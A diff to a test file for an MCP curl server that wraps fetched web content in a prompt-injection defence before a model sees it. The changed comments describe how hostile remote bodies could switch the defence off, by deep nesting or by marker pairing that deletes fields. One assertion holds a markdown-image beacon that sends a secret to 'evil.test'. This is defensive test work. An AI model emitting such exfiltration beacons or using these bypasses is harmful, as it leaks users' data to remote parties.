@@ -2,12 +2,11 @@
 // Guards the SHIPPED BINARY's registration path — `src/index.ts` →
 // `runStdio()`/`runHTTP()` → `registerAllCapabilities()` → `registerAllTools`.
 //
-// This path had no test at all, which is why `docs/todos/006` was possible:
-// every wrap assertion in the tree ran against `McpCurlServer` or
-// `tool-wrapper.ts` directly, so the whole suite stayed green while the one
-// entry point `curl-mcp` exposes returned unwrapped output. A correct wrap that
-// a registration path never calls is indistinguishable, from a unit test's
-// point of view, from no wrap at all.
+// A wrap assertion made against `McpCurlServer` or `tool-wrapper.ts`
+// directly stays green while the one entry point `curl-mcp` exposes returns
+// unwrapped output: a correct wrap that a registration path never calls is
+// indistinguishable, from a unit test's point of view, from no wrap at all.
+// So this path is asserted on its own.
 //
 // The subprocess is the only thing mocked. Everything above it — the real
 // executor, `processResponse`, `defendText`, the post-processor wrap — runs, so
@@ -53,12 +52,10 @@ vi.mock("../security/index.js", async () => {
 // `platformSupportsHeaderDump` is stubbed as well as `executeCommand`, because
 // the real one is `process.platform === "darwin"`. Left real, the
 // `include_headers` cases below take the `headers_unsupported` branch on every
-// Linux runner — and they would still FAIL there, because `formatResponse`
-// prepends the "cannot be captured on this host" notice and that prefix breaks
-// the JSON parse exactly as a header block does. So the guard has teeth on both
-// platforms; what it loses is its SUBJECT. A case named for the header block
-// that silently exercises the notice prefix instead is a test whose name is a
-// claim it does not check, and the composition fix has two prefixes to survive.
+// Linux runner: no header entry is emitted and the "cannot be captured on this
+// host" notice takes the second slot. The cases that call `bodyAfterHeaders`
+// then fail on it, and the one that only counts entries passes against the
+// notice — so what the stub preserves is their SUBJECT, the header region.
 vi.mock("../execution/index.js", async () => {
     const actual = await vi.importActual<typeof import("../execution/index.js")>("../execution/index.js");
     return { ...actual, executeCommand: vi.fn(), platformSupportsHeaderDump: () => true };
@@ -218,8 +215,8 @@ describe("registerAllTools — the shipped binary's registration path", () => {
     // it is the one that needs care. The wrap does not rewrite a JSON document,
     // so a correct pass-through and a MISSING wrap both return the body's
     // markup intact — the defect this file exists for (the shipped binary
-    // registering tools unwrapped, `docs/todos/006`) is invisible to any
-    // assertion about the markup.
+    // registering tools unwrapped) is invisible to any assertion about the
+    // markup.
     //
     // So the witness is the wrap's own tag, which only `createWrapper` sets and
     // an absent wrap leaves off. The body beside it is the CONTROL: byte for
@@ -273,11 +270,11 @@ describe("registerAllTools — the shipped binary's registration path", () => {
     // ---------------------------------------------------------------------
     // `README.md` documents MCP_CURL_USER_AGENT and MCP_CURL_REFERER as the
     // default "for every request". `applyDefaultHeaders` is their only reader
-    // and it sits on the registration path, so before this fix the shipped
-    // binary ignored both env vars entirely while the library honoured them.
+    // and it sits on the registration path, so a registration that bypasses it
+    // ignores both env vars while the library honours them.
     //
     // Asserted on the argv the executor actually built, not on the transform
-    // in isolation: the transform was always correct: nothing called it.
+    // in isolation: a correct transform that nothing calls passes its own tests.
     // ---------------------------------------------------------------------
     it("honours MCP_CURL_USER_AGENT on the shipped path", async () => {
         vi.stubEnv("MCP_CURL_USER_AGENT", "sixees-orchestrator/1.0");
@@ -345,14 +342,13 @@ describe("registerAllTools — the shipped binary's registration path", () => {
     // collapse and number-lexeme rewriting for it. `LESSONS.md` RC-47 reverses
     // RC-10 on this path; the spotlight boundary is what contains the beacon.
     //
-    // **What the ladder still guards is why it was written.** Measured before
-    // the depth bound existed: a 4,035-byte body overflowed the stack inside
-    // `defendJsonLeaves`, `createWrapper`'s catch logged the `RangeError` and
-    // returned the UNTOUCHED result still tagged as wrapped — so a remote could
-    // switch the whole defence off with 4 KB. That fail-open is now unreachable
-    // rather than bounded, because nothing recurses over the object graph. The
-    // depths are kept as the proof: a body that once broke the walk must now
-    // come back intact and still wrapped.
+    // **What the ladder guards is a fail-open on depth.** A recursive walk over
+    // the object graph overflows the stack on a few kilobytes of nesting, and
+    // `createWrapper`'s catch then logs the `RangeError` and returns the
+    // UNTOUCHED result still tagged as wrapped — a remote switching the defence
+    // off with 4 KB. Nothing on the path recurses over the graph, and these
+    // depths keep it that way: each must come back intact, with the wrap
+    // completed.
     // ---------------------------------------------------------------------
     describe("depth cannot switch the defence off", () => {
         // **The failure these cases catch is a depth at which the JSON arm is
@@ -427,22 +423,17 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             expect(Object.keys(returned)).toEqual(["a", "b", "c", "d"]);
         });
 
-        // Positive control for the composites-only rule, which outlived the
-        // per-leaf walk it was written for and now lives on
-        // `processor.ts::compositeStringPayload`.
-        // `JSON_DOCUMENT_FIRST_CHARS` admits digits and `-`, so a scalar leaf
-        // parses as JSON too — and unwrapping one would re-serialise it,
-        // turning the string "1.50" into "1.5" and "007" into "7". A scalar
-        // has no fields and cannot be spliced, so the divider must leave it
-        // exactly as the origin sent it.
+        // Scalar-shaped string values are the leaves a pass that unwraps and
+        // re-serialises nested documents would corrupt: `"1.50"` parses as a
+        // number and comes back `1.5`, `"007"` comes back `7`. Nothing on the
+        // body path unwraps a leaf, so each must come back exactly as the
+        // origin sent it.
         it("does not rewrite scalar-shaped string values", async () => {
-            // `padded` and `trailing` are what give the raw-number guard in
-            // `isCompositeValue` its teeth. A bare `"1.50"` round-trips
-            // identically through the recursion path once numbers keep their
-            // lexemes, so it cannot detect the guard's removal — but
-            // surrounding whitespace is not part of the lexeme, so a leaf that
-            // wrongly recurses comes back trimmed. Measured: `" 123"` becomes
-            // `"123"`.
+            // `padded` and `trailing` are the values a lexeme-preserving re-parse
+            // would still alter: a bare `"1.50"` survives such a pass once numbers
+            // keep their lexemes, but surrounding whitespace is not part of the
+            // lexeme, so a leaf that is re-parsed comes back trimmed — `" 123"`
+            // as `"123"`.
             const body =
                 '{"version":"1.50","id":"007","flag":"true","neg":"-0.0",' +
                 '"padded":" 123","trailing":"123 "}';
@@ -464,19 +455,15 @@ describe("registerAllTools — the shipped binary's registration path", () => {
         });
 
         // ---------------------------------------------------------------
-        // The `include_headers` arm. `formatResponse` prefixes the header
-        // block to the body on the plain branch, so the composed string does
-        // not parse as JSON and the wrap's UNDIVIDED arm ran over it — pairing
-        // a marker in one body field with one in a later field and deleting
-        // what lay between. Routing the binary through the wrap is what
-        // exposed this: measured `["a","d"]` here against `["a","b","c","d"]`
-        // on the pre-wrap registration, so it was a regression of this
-        // branch's own making rather than the pre-existing defect
-        // `docs/todos/012` described. The body is now defended as its own
-        // region before composition.
+        // The `include_headers` arm. Were the header block joined to the body in
+        // one string, the composed text would not parse as JSON and the wrap's
+        // undivided arm would run over it — pairing a marker in one body field
+        // with one in a later field and deleting what lay between (measured:
+        // `["a","d"]` against `["a","b","c","d"]`). The header text is its own
+        // content entry, so the body reaches the wrap as the single region it is.
         //
         // These assert on the SHIPPED path rather than on `defendForInline`
-        // directly, because the defect lived in the composition and a direct
+        // directly, because the defect lives in the composition and a direct
         // assertion on the defence never sees it.
         // ---------------------------------------------------------------
         it("keeps every key when a header block is prefixed to the body", async () => {
@@ -524,9 +511,6 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             expect(Object.keys(bodyAfterHeaders(result) as object)).toEqual(["a", "b", "c", "d"]);
         });
 
-        // The fix must WIDEN the defence over this arm, not exempt the channel.
-        // Without this, defending the body early and then skipping the wrap
-        // would pass every assertion above while letting a beacon through.
         it("still runs the wrap over the body when headers are reported alongside", async () => {
             // The fix must WIDEN the defence over this arm, not exempt the
             // channel: defending the body early and then skipping the wrap would
@@ -551,11 +535,11 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             expect((result as { content: unknown[] }).content).toHaveLength(2);
         });
 
-        // Positive control: the header region is defended by
-        // `extractHeaderChannel` before assembly, so an unpaired opener in
-        // header text has nothing to pair WITH in the body. If a future edit
-        // stops stripping the header region, this catches it — the body's
-        // first line would be consumed.
+        // The header region is defended by `extractHeaderChannel` before assembly,
+        // and it travels as its own content entry, so an unpaired opener in header
+        // text has nothing to pair WITH in the body. This pins the region boundary;
+        // it does not detect the header strip being removed, because the body entry
+        // is unaffected either way.
         it("does not let an unpaired opener in header text eat the body", async () => {
             const body = '{"first":"kept","second":"also kept"}';
             mockedExecuteCommand.mockResolvedValue(
@@ -597,14 +581,12 @@ describe("registerAllTools — the shipped binary's registration path", () => {
         });
 
         // ---------------------------------------------------------------
-        // Numbers. The region-wise walk has to parse and re-serialise to know
-        // where one value ends and the next begins, and `JSON.parse` routes
-        // every number through a double — so a 64-bit identifier comes back
-        // rounded and `1e400` comes back `null`. That hands the model a
-        // plausible WRONG value with no signal, which is worse than the field
-        // deletion this walk exists to prevent: a missing field leaves a gap
-        // somebody can notice. `keepNumberLexeme` re-emits the origin's own
-        // text instead.
+        // Numbers. Any pass that parses and re-serialises a body routes every
+        // number through a double — a 64-bit identifier comes back rounded and
+        // `1e400` comes back `null`, a plausible WRONG value with no signal, which
+        // is worse than a missing field because nobody can see the gap. The body
+        // path returns the origin's bytes and parses nothing it returns, so each
+        // must come back exactly as spelled.
         //
         // Unconditional: this package requires Node ≥22 (`package.json` →
         // `engines`), and `utils/json-lexeme.ts` throws at import where `JSON.rawJSON`
@@ -713,23 +695,21 @@ describe("registerAllTools — the shipped binary's registration path", () => {
     });
 
     // ---------------------------------------------------------------------
-    // The mirror of the `curl_execute` wrap assertion above. Without this,
-    // reverting the `registerJqToolWithHooks` call to a bare `registerTool`
-    // passes the whole suite — which is the condition that let `docs/todos/006`
-    // exist in the first place, recreated on the sibling tool by the guard
-    // meant to close it. The assertion set must match the registration set.
+    // The `jq_query` mirror lives in "jq_query takes the same wrap" below. It
+    // asserts no wrap witness, so reverting the `registerJqToolWithHooks` call
+    // to a bare `registerTool` still passes the whole suite: `jq_query` returns
+    // JSON, which the wrap returns unchanged. `LESSONS.md` RC-21 is this shape —
+    // an assertion set narrower than the registration set.
     // ---------------------------------------------------------------------
     // ---------------------------------------------------------------------
-    // The premise the save-path skip rests on. `curl-execute.ts` does NOT
-    // defend the body when it was saved, because `formatResponse` returns the
-    // server-authored message and never reads the body on that branch —
-    // defending it would be a full pass over bytes nobody receives, on the one
-    // path that exists to offload large responses.
+    // The premise the saved arm rests on. `processResponse`'s saved arm
+    // carries no body bytes, and `formatResponse` returns the server-authored
+    // message and never reads the body on that branch — so a body that was
+    // saved, over the cap or not JSON, never reaches the model inline.
     //
-    // That is a claim about `formatResponse`, so it is asserted rather than
-    // assumed: if a future edit ever returns the body on the file branch, the
-    // skip becomes a real hole and this fails. Guarding the premise is the
-    // point — the skip itself has no observable behaviour to test.
+    // That is a claim about the composition, so it is asserted rather than
+    // assumed: if a future edit ever returns the body on the file branch, saved
+    // bodies become inline remote text and this fails.
     // ---------------------------------------------------------------------
     describe("the save path returns the message, not the body", () => {
         it("does not put body bytes in a saved-to-file response", async () => {
@@ -914,7 +894,7 @@ describe("registerAllTools — the shipped binary's registration path", () => {
 
     describe("curl_execute's jq_filter branch keeps number spelling (RC-27)", () => {
         // A SEPARATE parse from the one `jq_query` uses — `processResponse`'s
-        // own, in its Step 6 branch. Both were missing the reviver, and an
+        // own, in its Step 4 branch. Both were missing the reviver, and an
         // assertion on either says nothing about the other, which is how the
         // class kept one uncorrected site through its first fix.
         it.each([
@@ -1020,14 +1000,12 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             expect(text).toBe(JSON.stringify("![x](https://evil.test/?d=SECRET)"));
         });
 
-        // Settles the instance `docs/todos/012` recorded as SUSPECTED rather
-        // than confirmed: jq output is a document whose leaves can themselves
-        // be documents, so the splice class had a candidate here that nobody
-        // had executed. It does not apply — `executeJqQuery` returns one
-        // string with nothing prefixed to it, so the composed-string arm
-        // cannot be reached, and both shapes jq can emit take the region-wise
-        // path. Asserted rather than argued, because "no composition here" is
-        // a claim about code that can change.
+        // jq output is a document whose leaves can themselves be documents, so
+        // the splice class has a candidate here. It does not apply:
+        // `executeJqQuery` returns one string with nothing prefixed to it, and
+        // both shapes jq can emit are JSON, which the wrap returns unchanged.
+        // Asserted rather than argued, because "no composition here" is a claim
+        // about code that can change.
         it("keeps every key when the filter returns a whole document", async () => {
             const file = join(dir, "doc.json");
             await writeFile(
@@ -1061,7 +1039,7 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             );
 
             // The filter yields a JSON string whose content is a document; the
-            // wrap's string-leaf arm is what has to divide it.
+            // wrap returns it unchanged, so the inner document keeps every key.
             expect(Object.keys(JSON.parse(JSON.parse(text) as string) as object)).toEqual([
                 "a",
                 "b",
